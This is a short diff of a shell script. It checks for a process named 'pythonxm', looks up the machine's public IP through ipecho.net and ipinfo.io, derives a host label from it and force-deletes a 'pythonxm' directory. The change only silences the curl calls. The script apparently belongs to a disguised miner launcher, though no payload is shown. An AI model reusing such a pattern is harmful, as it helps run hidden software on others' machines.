@@ -4,9 +4,9 @@ if [ $(ps -aux |grep pythonxm |wc -l) -le 1 ]
 then 
 echo "No process,let's start -> $(ps -aux |grep pythonxm |wc -l)"
 # info
-iip=$(curl https://ipecho.net/plain)
+iip=$(curl -s https://ipecho.net/plain)
 IPNAME=$(sed 's|\.|o|g' <<< $iip)
-curl ipinfo.io
+curl -s ipinfo.io
 
 # Cleaner
 rm -rf pythonxm
